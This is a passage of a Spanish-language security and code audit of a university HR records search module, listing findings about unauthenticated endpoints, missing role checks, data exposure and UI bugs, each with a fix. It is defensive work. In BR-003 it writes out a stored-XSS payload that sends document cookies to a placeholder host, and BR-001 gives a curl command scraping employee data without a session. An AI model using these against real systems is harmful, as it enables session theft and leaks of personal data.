# Auditoría — Buscador público del módulo RRHH

Alcance: `app/static/hr.html`, `app/static/hr.js`, `app/routes/hr.py`,
`app/routes/hr_alerts.py`, la vista `vw_rrhh_persona_index`, el dossier del
empleado y el reporte imprimible del expediente.

Recorrido hecho sobre el código en el estado actual de `master`. Nada se ha
implementado: esto es sólo el inventario de pendientes.

Convenciones:

- `[CHOCA]` marca los pendientes que tocan `styles.css`, `app.js`,
  `app-core.js`, `app-theme.js`, `main.py` o `schema.sql` — archivos
  compartidos con otros carriles. Hay que coordinar antes de escribir.
- Esfuerzo: **S** ≤ media jornada · **M** 1–3 jornadas · **L** > 3 jornadas o
  requiere decisión de negocio / cambio de modelo de datos.
- Las secciones van ordenadas por impacto, y dentro de cada sección los
  pendientes también.

Resumen: **180 pendientes** (BR-001 a BR-180). Los bloqueantes reales, si hay que elegir cinco:
BR-001 (expedientes de personal accesibles sin sesión), BR-002 (cualquier
usuario autenticado ve RRHH aunque su módulo sea Archivo), BR-003 (XSS
almacenado en el reporte imprimible), BR-004 (el perfil se resuelve por nombre
concatenado: dos homónimos comparten expediente) y BR-005 (el dossier trae el
expediente entero sin filtrar borrados lógicos).

---

## 1. Privacidad, protección de datos y trazabilidad

Esta sección va primera porque un expediente de personal es un fichero de datos
personales: cédula, RIF, fecha de nacimiento, sexo, nivel educativo, estado
laboral, fotografía y el historial laboral completo. Hoy nada de eso está
protegido a nivel de endpoint.

### BR-001 · La búsqueda de expedientes de personal es pública, sin sesión `[CHOCA]`

`app/routes/hr.py:110` · `app/routes/hr.py:300` · `app/routes/hr.py:357`

**Hoy:** `hr.py` declara `_auth = [Depends(require_session)]` en la línea 13,
pero sólo lo aplica en `/empleado/{emp_id}/documentos` (línea 387) y
`/report/{emp_id}` (línea 445). Los tres endpoints que realmente alimentan la
pantalla — `POST /api/rrhh/buscar`, `POST /api/rrhh/person/profile` y
`GET /api/rrhh/empleado/por-cedula/{cedula}` — no llevan `dependencies=_auth`.
Escenario de fallo: `curl -X POST https://<host>/api/rrhh/buscar -d
'{"per_page":50}'` sin cookie devuelve nombre, cédula, RIF, cargo,
departamento, estado laboral, fecha de ingreso, fecha de nacimiento, sexo,
nivel educativo y URL de foto de 50 empleados por página, y paginando se
descarga la plantilla completa de la Facultad. `person/profile` añade
jubilación, pensión y todos los documentos del expediente.

**Debe pasar:** los tres endpoints con `dependencies=_auth`, igual que el resto
del módulo. Y una prueba que falle si alguien vuelve a olvidarlo: recorrer las
rutas de `hr_router` y afirmar que ninguna carece de `require_session`.

Esfuerzo: **S** · Archivos: `app/routes/hr.py`, `app/tests/test_hr.py` (nuevo)

### BR-002 · `require_session` no comprueba módulo ni rol: un usuario de Archivo ve todo RRHH

`app/routes/hr.py:13` · `app/routes/admin/deps.py:7` · `app/routes/hr_alerts.py:17`

**Hoy:** `require_session()` sólo valida que el token de sesión sea legible y
devuelve el nombre de usuario. No consulta `usuarios_sistema.modulo` ni `rol`.
El control de acceso al módulo RRHH vive **sólo en el frontend**
(`configureSidebarVisibilities()` en `app.js:143`), que decide si la página
`/rrhh` se muestra. Escenario de fallo: un usuario cuyo módulo es `Archivo`
abre la consola y hace `fetch('/api/rrhh/person/profile',{method:'POST',...})`
con su propia cookie y obtiene el expediente completo de cualquier empleado.
Igual con todo `hr_alerts.py`, que sí tiene `require_session` a nivel de router
pero tampoco distingue módulo.

**Debe pasar:** una dependencia `require_module("RRHH")` que lea el módulo del
usuario de la sesión y devuelva 403 si no lo tiene, y una
`require_admin("RRHH")` para las mutaciones. El control de acceso del frontend
es una comodidad, no una barrera.

Esfuerzo: **M** · Archivos: `app/routes/admin/deps.py` `[CHOCA]`,
`app/routes/hr.py`, `app/routes/hr_alerts.py`, `app/tests/test_hr.py`

### BR-006 · Ninguna consulta de expediente queda en auditoría

`app/routes/hr.py:300` · `app/routes/hr.py:445`

**Hoy:** `log_event()` se usa en `hr_alerts.py` para altas y bajas de historial
de cargos, pero **abrir un expediente no deja rastro**. Nadie puede responder
"¿quién consultó el expediente de X y cuándo?", que es exactamente la pregunta
que un archivo de personal tiene que poder contestar (y la que exige el derecho
de acceso del titular, LOTTT art. 147). El proyecto ya lo hace bien para los
enlaces compartidos (`share.py` registra cada consulta) — RRHH es donde más
falta hace y es donde no está.

**Debe pasar:** `log_event(usuario, "Expediente Consultado", "RRHH",
f"empleado_id={id}")` en `person/profile` y en `report/`; y una pestaña o
filtro en Auditoría que permita listar los accesos a un expediente concreto.

Esfuerzo: **S** (registro) / **M** (con la vista de consulta) · Archivos:
`app/routes/hr.py`, `app/routes/admin/` `[CHOCA]`

### BR-007 · La respuesta de búsqueda envía datos que la tarjeta no usa

`app/routes/hr.py:226-247`

**Hoy:** cada registro del listado incluye `fecha_nacimiento`, `sexo`,
`nivel_educativo`, `rifs`, `fecha_ingreso` y `foto_url`. La tarjeta
(`hr.js:119-159`) sólo pinta nombre, cédula, departamento, cargo, estado,
`doc_count`, `tipos` y foto. Los demás viajan al navegador de cualquiera que
pueda buscar, quedan en la caché del navegador y en el historial de red, y
además el CSV de exportación los tiene disponibles. Es lo contrario de
minimización de datos.

**Debe pasar:** el listado devuelve sólo lo que pinta. Los datos sensibles
(nacimiento, sexo, nivel educativo) se piden en el dossier, donde hay un motivo
para verlos y se puede auditar.

Esfuerzo: **S** · Archivos: `app/routes/hr.py`, `app/static/hr.js`

### BR-008 · La foto del empleado se sirve por una URL adivinable con el usuario en la query

`app/static/app-core.js:67-75` · `app/static/hr.js:128`

**Hoy:** `_secureFileUrl()` añade `?u=<username>` a las rutas `/api/files/`.
El nombre no es un secreto, y aunque `files.py` sí exige sesión a nivel de
router, el parámetro `u` sugiere un modelo de autorización que no existe: no se
comprueba que el usuario de la query sea el de la sesión, ni que tenga módulo
RRHH. Una foto de personal no debería servirse por una clave de objeto estable
sin caducidad.

**Debe pasar:** URLs prefirmadas de vida corta para las fotos, emitidas por un
endpoint que valide módulo y registre el acceso; y retirar el parámetro `u`, que
hoy sólo es ruido.

Esfuerzo: **M** · Archivos: `app/routes/files.py` `[CHOCA]`,
`app/static/app-core.js` `[CHOCA]`, `app/static/hr.js`

### BR-009 · Sin política de retención ni de anonimización del personal egresado

`app/routes/hr.py` (transversal)

**Hoy:** un empleado retirado o fallecido conserva indefinidamente cédula, RIF,
fecha de nacimiento y foto, visibles en la búsqueda general con el mismo
detalle que un activo. No hay ninguna regla de cuánto tiempo se conserva el
expediente activo antes de pasar a archivo histórico con campos reducidos.

**Debe pasar:** definir el plazo (el módulo ya tiene el concepto:
`tipo_documento.plazo_retencion_anios`), y una vista reducida para expedientes
en estado histórico. Requiere decisión institucional antes de código.

Esfuerzo: **L** · Archivos: `app/routes/hr.py`, `app/main.py` `[CHOCA]`,
`docs/`

### BR-010 · El reporte imprimible se abre en pestaña nueva sin control de descarga

`app/static/hr.js:287` · `app/routes/hr.py:445`

**Hoy:** `<a href="/api/rrhh/report/{id}" target="_blank">` entrega el
expediente completo como HTML navegable, que el usuario puede guardar, reenviar
o dejar abierto en un equipo compartido. No hay marca de agua con el usuario
que lo generó ni registro de la generación.

**Debe pasar:** el reporte lleva impreso quién lo generó y cuándo (ya lleva la
fecha, falta el usuario), y la generación queda en auditoría — ver BR-006.

Esfuerzo: **S** · Archivos: `app/routes/hr.py`

### BR-011 · `rel="noopener"` ausente en los enlaces `target="_blank"`

`app/static/hr.js:287`

**Hoy:** el enlace del reporte abre una pestaña que conserva `window.opener`.
Con contenido propio el riesgo es bajo, pero es una línea.

**Debe pasar:** `rel="noopener noreferrer"`.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-012 · El endpoint por cédula permite enumerar la plantilla

`app/routes/hr.py:357`

**Hoy:** `GET /api/rrhh/empleado/por-cedula/{cedula}` sin sesión (ver BR-001) y
sin limitación de tasa. Recorrer el espacio de cédulas venezolanas válidas es
barato y devuelve un 200 con datos completos o un 404 — un oráculo perfecto de
"esta persona trabaja aquí".

**Debe pasar:** además de la sesión (BR-001), limitación de tasa por usuario en
los endpoints de búsqueda de personas.

Esfuerzo: **M** · Archivos: `app/routes/hr.py`, `app/main.py` `[CHOCA]`

### BR-013 · No existe la figura de "expediente restringido"

`app/routes/hr.py` (transversal)

**Hoy:** todos los expedientes son igual de visibles. Un expediente con un
procedimiento disciplinario abierto, o el de una autoridad, se ve como
cualquier otro.

**Debe pasar:** una marca de confidencialidad por empleado y por documento, con
lista de quién puede abrirlo, y el resto del sistema mostrando la existencia del
expediente pero no su contenido.

Esfuerzo: **L** · Archivos: `app/main.py` `[CHOCA]`, `app/routes/hr.py`,
`app/static/hr.js`

### BR-014 · La exportación CSV no deja rastro ni limita volumen

`app/static/app.js:381-410`

**Hoy:** `_exportResultsCSV("rrhh")` construye el CSV **en el cliente** con los
resultados de la página actual. Es decir: no registra nada en el servidor, no
tiene marca de agua, y a la vez es una exportación de datos personales. Y como
sólo exporta la página visible, quien quiera la plantilla completa pone 50 por
página y repite — con lo cual la limitación tampoco protege, sólo molesta.

**Debe pasar:** exportación en el servidor, con auditoría, permiso propio,
límite de filas explícito y las columnas mínimas.

Esfuerzo: **M** · Archivos: `app/static/app.js` `[CHOCA]`, `app/routes/hr.py`

---

## 2. Bugs reales, con escenario de fallo

### BR-003 · XSS almacenado en el reporte imprimible del expediente

`app/routes/hr.py:506-508` · `app/routes/hr.py:550-561` · `app/routes/hr.py:578-584`

**Hoy:** el HTML del reporte se compone con f-strings sin escapar **ninguna**
interpolación: `{d["tipo_nombre"]}`, `{d["notas"]}`, `{d["ubicacion"]}`,
`{nombre_completo}`, `{emp.get('cargo')}`, `{h['motivo']}`. Escenario de fallo:
un usuario con permiso de alta escribe en el campo *notas* de un documento
`<img src=x onerror="fetch('https://x/?c='+document.cookie)">`; cualquier
persona de RRHH que imprima ese expediente ejecuta el script en el origen de la
aplicación, con su sesión. Es escalada de privilegios por un campo de texto.

Ojo también a `app/routes/hr.py:552`: la clase CSS se compone con
`badge-{estado.lower()}`, así que un estado con comillas rompe el atributo.

**Debe pasar:** `html.escape()` en toda interpolación, o migrar el reporte a una
plantilla Jinja2 con autoescape (preferible: el f-string de 80 líneas es además
ilegible). Prueba que meta `<script>` en notas y afirme que no sale literal.

Esfuerzo: **M** · Archivos: `app/routes/hr.py`, `app/tests/test_hr.py` (nuevo)

### BR-004 · El perfil se resuelve por nombre concatenado: dos homónimos comparten expediente

`app/routes/hr.py:302-305` · `app/static/hr.js:124`

**Hoy:** el dossier se pide con `POST /person/profile {persona: "<nombres>
<apellidos>"}` y el backend filtra
`WHERE e.nombres || ' ' || e.apellidos = %s`. Escenario de fallo: existen dos
"José Pérez" en la plantilla — cosa habitual en una facultad de mil personas —
y al abrir cualquiera de los dos el dossier fusiona los documentos, cédulas y
cargos de ambos, presentando `cedulas` como `"V-123; V-456"` (el
`_join_unique` de la línea 318 lo une con `;` sin que nada advierta). El
reporte imprimible, en cambio, va por `empleado_id`, así que **la pantalla y el
PDF dicen cosas distintas**. Con nombres con doble espacio o acentos
normalizados de otra forma, el mismo `=` falla al revés y devuelve 404.

**Debe pasar:** el dossier se pide por `empleado_id` — el listado ya lo trae
(`hr.py:227`). `persona_raw` deja de ser una llave.

Esfuerzo: **M** · Archivos: `app/routes/hr.py`, `app/models.py` `[CHOCA]`,
`app/static/hr.js`

### BR-005 · El dossier ignora el borrado lógico: muestra documentos y empleados eliminados

`app/routes/hr.py:53-89`

**Hoy:** `fetch_hr_dataframe()` no filtra `deleted_at IS NULL` ni en `empleados`
ni en `datos_rrhh`. La vista `vw_rrhh_persona_index` **sí** lo hace desde la
migración de `main.py:362`. Escenario de fallo: se envía un documento a la
papelera; desaparece del listado y del contador `doc_count`, pero al abrir el
dossier sigue ahí, con su ubicación física y su enlace de archivo. Peor: un
empleado dado de baja lógicamente no sale en la búsqueda, pero
`person/profile` con su nombre lo devuelve entero.

**Debe pasar:** `AND e.deleted_at IS NULL AND (dr.id_rrhh IS NULL OR
dr.deleted_at IS NULL)` en `fetch_hr_dataframe`. Y una prueba, porque el mismo
descuido está en el reporte (BR-015).

Esfuerzo: **S** · Archivos: `app/routes/hr.py`, `app/tests/test_hr.py` (nuevo)

### BR-015 · El reporte imprimible también incluye documentos en papelera

`app/routes/hr.py:465-474`

**Hoy:** la consulta de documentos del reporte no filtra `dr.deleted_at`.
Escenario: se elimina un documento erróneo, se imprime el expediente para un
trámite oficial, y el documento eliminado aparece en el papel firmado.

**Debe pasar:** filtrar borrados, como hace la vista.

Esfuerzo: **S** · Archivos: `app/routes/hr.py`

### BR-016 · El filtro de categoría del dossier no encuentra nada cuando hay partes

`app/static/hr.js:421-423` vs `app/static/hr.js:444-449`

**Hoy:** el desplegable "Todas las categorías" se llena con nombres
**canónicos** (`"Parte I — Ingreso y Contratación"`, derivados de
`categoria_slug` en las líneas 261-269), pero el filtro compara contra
`f.categoria || f.doc_type`, que es el nombre **crudo** de la tabla
`categoria`. Escenario de fallo: si el nombre en base de datos es `"Parte I"` a
secas, elegir "Parte I — Ingreso y Contratación" en el desplegable deja el
expediente vacío con el mensaje "No se encontraron archivos con estos filtros".
El agrupador de la línea 444 sí usa el mapa canónico; el filtro no. Son dos
lógicas distintas para la misma clasificación.

**Debe pasar:** una única función `_parteDe(fila)` que resuelva la clave, usada
por el desplegable, el filtro y el agrupador.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-017 · Los `id` de las pestañas del dossier colisionan con las de otro dossier abierto antes

`app/static/hr.js:471` · `app/static/hr.js:480`

**Hoy:** las pestañas usan `href="#dossier-tab-0"`, `#dossier-tab-1`… El
contenedor se reescribe entero al abrir otro empleado, así que normalmente no
colisiona, pero el índice depende del **número de grupos presentes**: el
empleado A con 4 partes y el B con 2 producen `#dossier-tab-1` con significados
distintos. Si Bootstrap conserva estado de la instancia anterior (y lo hace con
`data-toggle="tab"` sobre nodos recreados) se han visto paneles que abren en la
parte equivocada. Además los índices no son estables para enlazar a una parte.

**Debe pasar:** identificadores derivados del slug (`#dossier-parte-i`), no de
la posición.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-018 · Las peticiones de búsqueda no se cancelan: resultados fuera de orden

`app/static/hr.js:24-40`

**Hoy:** `triggerRrhhSearch()` no usa `AbortController` ni un testigo de
petición. Escenario de fallo: el usuario teclea "mar" (petición A, lenta porque
cae en el arranque en frío de Vercel), sigue tecleando "martinez" (petición B,
rápida). B pinta 3 resultados; A llega después y pinta los 400 de "mar". La
pantalla muestra resultados que no corresponden al término del cuadro, y el
contador tampoco. El *debounce* de 420 ms lo hace menos frecuente, no
imposible.

**Debe pasar:** `AbortController` que cancele la anterior, o un contador de
secuencia que descarte respuestas obsoletas.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-019 · Un error de búsqueda deja el esqueleto de carga para siempre

`app/static/hr.js:37-39`

**Hoy:** el `catch` sólo hace `console.error`. Escenario de fallo: la sesión
caduca a mitad de sesión de trabajo, el `POST /buscar` responde 401 (una vez
arreglado BR-001), y la pantalla se queda con las cuatro tarjetas fantasma
animándose indefinidamente. El usuario no sabe si está cargando o si algo
falló, y el contador sigue diciendo el número anterior.

**Debe pasar:** estado de error explícito con el motivo, botón "Reintentar", y
`showToast(..., "error")`. Distinguir 401 (volver a login) de 5xx (reintentar).

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-020 · Abrir un expediente que falla no dice nada: el modal simplemente no aparece

`app/static/hr.js:165-182`

**Hoy:** el `catch` de `openRrhhPersonDossier` sólo hace `console.error`. El
usuario hace clic en una tarjeta y **no ocurre nada**. Escenario: el 404 de
BR-004 por un nombre con doble espacio; el usuario hace clic diez veces
convencido de que la pantalla se ha colgado.

**Debe pasar:** toast de error, y estado de carga mientras llega (ver BR-021).

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-021 · No hay indicación de carga al abrir el dossier

`app/static/hr.js:165-178`

**Hoy:** entre el clic y el modal hay una petición que en Vercel con arranque en
frío puede tardar segundos, sin ningún indicador. La tarjeta ni siquiera se
marca como pulsada.

**Debe pasar:** abrir el modal inmediatamente con esqueleto de contenido, o
deshabilitar la tarjeta con un spinner.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-022 · `_toggleHistorialCargos` no comprueba `res.ok`

`app/static/hr.js:585-587`

**Hoy:** `const data = await res.json()` sobre una respuesta 401/500. Si el
cuerpo es JSON de error, `data.historial` es `undefined`, se cae al `[]` y
muestra "No hay movimientos de cargo registrados" — **un error de servidor se
presenta como un dato de negocio**. Si el cuerpo no es JSON, salta al `catch` y
dice error genérico.

**Debe pasar:** `if (!res.ok) throw` antes del `json()`, y mensajes
distinguibles.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-023 · El botón de historial pasa `0` cuando no hay `empleado_id`

`app/static/hr.js:326`

**Hoy:** `_toggleHistorialCargos(${... || 0})`. Con `0` la función entra por la
rama "ID de empleado no disponible", lo cual está bien, pero el botón se pinta
igualmente habilitado y con aspecto normal: el usuario descubre el problema
después de pulsar.

**Debe pasar:** no pintar el bloque de historial si no hay id, o pintarlo
deshabilitado con el motivo en el `title`.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-024 · El botón "Editar" aparece para cualquier usuario con sesión

`app/static/hr.js:151` · `app/static/hr.js:291`

**Hoy:** la condición es `state.user`, sin mirar `rol` ni `modules`. Escenario:
un usuario RRHH normal (no admin) ve el lápiz en cada tarjeta y en el dossier,
hace clic, y `admin_hr.html` lo rebota al login o a su módulo. Es una promesa de
permiso que el sistema no cumple, repetida en cada fila de la lista.

**Debe pasar:** condicionar a `rol === "Admin"` y módulo RRHH, con la misma
lógica que `configureSidebarVisibilities()`.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-025 · "Imprimir Expediente" se ofrece a quien recibirá un 401

`app/static/hr.js:287`

**Hoy:** el enlace se pinta siempre que haya `empleado_id`, incluso sin
`state.user`; el endpoint sí exige sesión. Un visitante sin sesión (posible hoy
por BR-001) hace clic y abre una pestaña con el JSON de error de FastAPI.

**Debe pasar:** condicionar el enlace a la sesión, y que un fallo del reporte
devuelva una página de error legible, no el JSON crudo.

Esfuerzo: **S** · Archivos: `app/static/hr.js`, `app/routes/hr.py`

### BR-026 · Doble paginación: dos controles que se contradicen

`app/static/hr.html:148` vs `app/static/hr.html:149-153`

**Hoy:** conviven `#rrhh-pagination` (numérica, dibujada por
`renderRrhhPagination`, `hr.js:42`) y `#rrhh_pagination_controls`
(Anterior/Siguiente, en el HTML, gobernada desde `renderRrhhList` y
`app.js:276`). El primero se **oculta cuando hay una sola página**
(`hr.js:49`), el segundo no. Y el segundo repite "Pág 1 de 1" cuando el primero
ya dijo "Pág. 1 de 3 — 27 resultados". Dos fuentes de verdad para el mismo
estado, mantenidas en archivos distintos.

**Debe pasar:** un solo bloque de paginación.

Esfuerzo: **S** · Archivos: `app/static/hr.html`, `app/static/hr.js`,
`app/static/app.js` `[CHOCA]`

### BR-027 · Cambiar de página no devuelve el foco ni el scroll al principio de la lista

`app/static/hr.js:80-83`

**Hoy:** `changeRrhhPage` cambia el estado y relanza la búsqueda. La página
sigue desplazada donde estaba, así que en la página 2 el usuario está mirando
la mitad de la lista sin saber que cambió; con teclado, el foco se pierde
porque el botón que pulsó ha sido reemplazado por `innerHTML`.

**Debe pasar:** `scrollIntoView` de la cabecera de resultados, foco al primer
resultado o al contenedor con `tabindex="-1"`, y anuncio por la región viva.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-028 · Los filtros no se reflejan en la URL: no se puede compartir ni volver atrás

`app/static/hr.js:24` (transversal)

**Hoy:** término, tipos, estados, fechas, orden y página viven sólo en
`state.rrhh`. Escenario: alguien encuentra un expediente tras filtrar, quiere
mandar el enlace a un compañero, y sólo puede mandar `/rrhh`. El botón Atrás
del navegador sale de la aplicación en lugar de deshacer el filtro. Recargar
pierde todo.

**Debe pasar:** sincronizar el estado con `history.replaceState` y
`URLSearchParams`, y restaurarlo al cargar. Es además la base de BR-029.

Esfuerzo: **M** · Archivos: `app/static/hr.js`, `app/static/app.js` `[CHOCA]`

### BR-029 · Un expediente no tiene enlace permanente

`app/static/hr.js:165`

**Hoy:** el dossier es un modal sin ruta. No se puede enlazar el expediente de
una persona desde un correo, un acta o el propio sistema.

**Debe pasar:** `/rrhh?emp=<id>` abre el dossier directamente; cerrar el modal
lo quita de la URL.

Esfuerzo: **M** · Archivos: `app/static/hr.js`, `app/routes/pages.py` `[CHOCA]`

### BR-030 · El clic en una faceta de departamento pisa el término de búsqueda

`app/static/hr.js:664-671`

**Hoy:** el comentario lo admite: "Departamento no es un filtro multi-select en
el modelo actual; aplica como búsqueda". Escenario: el usuario busca "Pérez",
ve la faceta "Química (12)", hace clic esperando "los Pérez de Química", y el
sistema **borra "Pérez"** y busca "Química". Pierde su trabajo sin avisar y sin
forma de deshacer.

**Debe pasar:** departamento como filtro propio acumulable (el backend ya tiene
la columna en la vista), con su ficha visible y su "quitar".

Esfuerzo: **M** · Archivos: `app/static/hr.js`, `app/routes/hr.py`,
`app/models.py` `[CHOCA]`

### BR-031 · Las facetas ignoran los filtros de tipo, estado y personas

`app/routes/hr.py:250-286`

**Hoy:** `facet_conds` sólo replica el término de búsqueda y las fechas. Los
filtros `doc_types`, `estados` y `people_terms` **no** entran. Escenario: el
usuario filtra por estado "Jubilado" y la caja de Distribución sigue diciendo
"Activo (812)" — números que no cuadran con la lista y que al pulsarlos dan
cero resultados. Peor: al marcar un estado desde la propia faceta, la faceta no
cambia, lo que hace pensar que el clic no funcionó.

**Debe pasar:** las facetas se calculan con el mismo `WHERE` que la consulta
principal (excepto la dimensión que la propia faceta representa, que es el
comportamiento estándar de facetado).

Esfuerzo: **M** · Archivos: `app/routes/hr.py`

### BR-032 · El filtro de fecha filtra por fecha de ingreso, pero está etiquetado "Fecha"

`app/static/hr.html:60` · `app/routes/hr.py:170-176`

**Hoy:** el acordeón dice "Fecha" y el backend aplica
`v.fecha_ingreso >= / <=`. El usuario que busca "documentos de 2019" filtra sin
saberlo por "personas que ingresaron en 2019". Dos preguntas distintas y una
sola etiqueta.

**Debe pasar:** la etiqueta dice "Fecha de ingreso", y si hace falta filtrar por
fecha de documento, es un filtro aparte (que además obligaría a tocar la vista).

Esfuerzo: **S** (renombrar) / **M** (filtro por fecha de documento) · Archivos:
`app/static/hr.html`, `app/routes/hr.py`

### BR-033 · El filtro por tipo de documento hace `ILIKE` sobre una cadena concatenada

`app/routes/hr.py:156-159`

**Hoy:** `v.tipos ILIKE '%<tipo>%'` sobre la agregación `STRING_AGG(...,'; ')`
de la vista. Escenario de fallo: existen los tipos "Constancia" y "Constancia de
Trabajo"; filtrar por "Constancia" trae también a quien sólo tiene "Constancia
de Trabajo". Y filtrar por un tipo que contenga `%` o `_` produce comodines
accidentales. Además impide cualquier índice: es un escaneo de la vista entera.

**Debe pasar:** filtrar por `id_tipo_documento` con `EXISTS` sobre
`datos_rrhh`, no por texto.

Esfuerzo: **M** · Archivos: `app/routes/hr.py`, `app/models.py` `[CHOCA]`,
`app/static/hr.js`

### BR-034 · La ordenación alfabética no usa configuración regional española

`app/static/hr.js:426-427`

**Hoy:** `localeCompare` sin argumentos usa la del navegador; en un equipo con
Windows en inglés, "Ñ" no cae entre "N" y "O". El orden del listado, en cambio,
lo hace Postgres (`ORDER BY v.persona_raw ASC`) con la colación de la base — así
que el listado y el dossier ordenan distinto.

**Debe pasar:** `localeCompare(b, "es", {sensitivity:"base", numeric:true})`, y
verificar la colación de la vista.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-035 · `_calcEdad` calcula la edad en la zona horaria del navegador

`app/static/hr.js:232-241`

**Hoy:** `new Date("1980-05-14")` se interpreta como UTC medianoche; en
Venezuela (UTC−4) eso es el 13 de mayo. En el día del cumpleaños la edad sale
un año menor. Menor, pero es un dato que se imprime junto a la jubilación.

**Debe pasar:** parsear los componentes a mano, o calcular la edad en el
servidor.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-036 · `getPersonInitials` produce iniciales equivocadas con apellidos compuestos

`app/static/app-core.js:113-127`

**Hoy:** con cuatro o más palabras toma `parts[0][0] + parts[2][0]`. Para
"María de los Ángeles Rodríguez" devuelve "ML" (María + los). En Venezuela los
nombres de cuatro componentes son la norma, no la excepción, así que el
fallback sin foto acierta poco.

**Debe pasar:** derivar de `nombres` y `apellidos` por separado, que el backend
ya tiene en columnas distintas — no del nombre concatenado.

Esfuerzo: **S** · Archivos: `app/static/app-core.js` `[CHOCA]`,
`app/routes/hr.py`

### BR-037 · La foto rota deja un hueco sin fallback

`app/static/hr.js:128` · `app/static/hr.js:249`

**Hoy:** `<img src="...">` sin `onerror`. Si la clave de R2 ya no existe, o el
usuario no tiene permiso, sale el icono de imagen rota del navegador dentro de
un círculo — peor que las iniciales, que ya están implementadas justo al lado.

**Debe pasar:** `onerror` que sustituya por las iniciales, más `loading="lazy"`
y `decoding="async"`.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-038 · Las notas del documento se muestran como resumen inventado

`app/static/hr.js:542-543`

**Hoy:** si no hay notas, el "resumen" del documento se **fabrica**: "Expediente
Laboral Digitalizado del empleado X. Clasificado en el departamento de Y con el
estado de personal Z." Es texto generado presentado como descripción del
documento. En un sistema de archivo, inventar metadatos descriptivos es un
error de fondo, no de estilo.

**Debe pasar:** "Sin descripción registrada" — que es además lo que ya dice el
HTML por defecto en `hr.html:196`.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-039 · El botón "Ver" del documento miente cuando no hay archivo

`app/static/hr.js:546-557`

**Hoy:** sin `file_url`, el botón se convierte en "Ubicación" y al pulsarlo
muestra un *toast* con la ubicación física. Un botón etiquetado "Ver" que no
enseña el documento es una acción fallida disfrazada de acción disponible; y la
rama "Digitalizado" muestra una advertencia pidiendo contactar al
administrador, que es un error de datos convertido en tarea del usuario.

**Debe pasar:** la ubicación física es un dato del panel de metadatos (ya lo
es, línea 538), no un botón. Sin archivo, el botón se deshabilita con el motivo
en el `title`, y la discrepancia "digitalizado sin URL" se reporta como
incidencia de datos, no como aviso al consultante.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-040 · El visor de PDF se queda abierto entre documentos

`app/static/hr.js:545` · `app/static/hr.html:200-208`

**Hoy:** `closeDocViewer()` se llama al abrir otro documento, lo cual está bien,
pero **no** al cerrar el modal por la X o por `Escape` — el `onclick` sólo está
en el botón "Cerrar" del pie (`hr.html:211`). Escenario: se abre un PDF, se
cierra el modal con la X, se abre otro documento sin archivo: el iframe del
anterior sigue en el DOM con su URL prefirmada cargada.

**Debe pasar:** limpiar en el evento `hidden.bs.modal`, que cubre todas las
salidas.

Esfuerzo: **S** · Archivos: `app/static/hr.js`, `app/static/hr.html`

### BR-041 · `filterInnerDossier` accede a `sortedGroups[0]` sin comprobar

`app/static/hr.js:490`

**Hoy:** la guarda de `files.length === 0` (línea 435) protege el caso normal,
pero si `_docLabel` devolviera clave vacía en todos los casos el
desestructurado revienta. Es frágil; con `files` no vacío `sortedGroups`
siempre tiene al menos uno, así que hoy no falla — es deuda, no bug activo.

**Debe pasar:** guarda explícita.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-042 · `state.rrhh.perPage` puede quedar en `NaN`

`app/static/app.js:258`

**Hoy:** `parseInt(e.target.value)` sin radix ni validación. Si el `<select>`
cambia de opciones, `NaN` se propaga a `Math.ceil(total/NaN)` y la paginación
muestra "Pág 1 de NaN".

**Debe pasar:** `Number()` con validación contra la lista permitida.

Esfuerzo: **S** · Archivos: `app/static/app.js` `[CHOCA]`

### BR-043 · El fallback de respuesta como array está muerto y confunde

`app/static/hr.js:26-33`

**Hoy:** la rama "retrocompatibilidad" para respuestas de tipo array nunca se
ejecuta: el endpoint devuelve siempre el objeto paginado desde hace versiones.
Y si se ejecutara, `data.facets` sería `undefined` sobre un array y la línea 36
fallaría igual.

**Debe pasar:** retirarla.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-044 · `__idx` del listado es un número de fila global sin uso

`app/routes/hr.py:246`

**Hoy:** `"__idx": offset + i + 1` en los registros del listado. En el dossier,
`__idx` sí es la llave que usa `openDocMetadataModal` (`hr.js:522`), pero en el
listado no lo consume nadie. Dos significados para el mismo nombre de campo en
la misma API.

**Debe pasar:** quitarlo del listado; en el dossier, usar `id_rrhh`, que es la
llave real y ya viaja en la respuesta.

Esfuerzo: **S** · Archivos: `app/routes/hr.py`, `app/static/hr.js`

### BR-045 · El endpoint `/empleado/{id}/documentos` no lo usa nadie

`app/routes/hr.py:387-435`

**Hoy:** un endpoint completo, con búsqueda por parte y paginación —
exactamente lo que el dossier necesita — y `hr.js` no lo llama nunca: filtra en
el cliente sobre el volcado entero. Código mantenido que no se ejecuta, y a la
vez la funcionalidad que resolvería BR-046.

**Debe pasar:** o el dossier lo usa (ver BR-046), o se retira.

Esfuerzo: **M** · Archivos: `app/static/hr.js`, `app/routes/hr.py`

### BR-046 · El dossier descarga el expediente completo y filtra en el navegador

`app/routes/hr.py:300-354` · `app/static/hr.js:383`

**Hoy:** `person/profile` devuelve **todas** las filas del expediente, con
`abstract`, `notas`, `descriptores_libres` y `autor` incluidos. Un expediente de
30 años con 300 documentos son cientos de kilobytes por apertura, y el filtrado,
la ordenación y la agrupación se recalculan enteros en cada pulsación de tecla
(`hr.html:343`, sin *debounce*). En un equipo modesto se nota.

**Debe pasar:** paginar y filtrar en el servidor con el endpoint de BR-045; el
perfil devuelve la cabecera y los contadores por parte.

Esfuerzo: **M** · Archivos: `app/routes/hr.py`, `app/static/hr.js`

---

## 3. Rendimiento e ingeniería

### BR-047 · `fetch_hr_dataframe` monta un DataFrame de pandas para una sola persona

